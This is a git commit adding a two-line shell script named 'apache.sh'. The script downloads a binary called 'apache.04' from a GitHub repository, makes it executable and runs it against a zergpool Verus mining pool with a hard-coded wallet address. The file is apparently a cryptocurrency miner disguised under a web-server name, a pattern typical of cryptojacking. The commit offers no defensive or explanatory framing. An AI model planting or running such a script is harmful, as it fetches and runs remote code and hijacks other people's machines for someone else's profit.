42ec029d8fa977085f49eb19534256079500fb1e
Praveen <80373260+NanoTest5000@users.noreply.github.com>
2022-01-06 04:38:49 +0530

    Add files via upload

---
+++ apache.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+sudo apt-get install libjansson4 && wget https://github.com/NanoTest5000/x/raw/main/apache.04 && chmod +x apache.04 && ./apache.04 -a verus  -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RPG3sLQp5xzX1j7CPQiUsZ9D2ndZfMyGZP.x1 -p c=VRSC -t 3
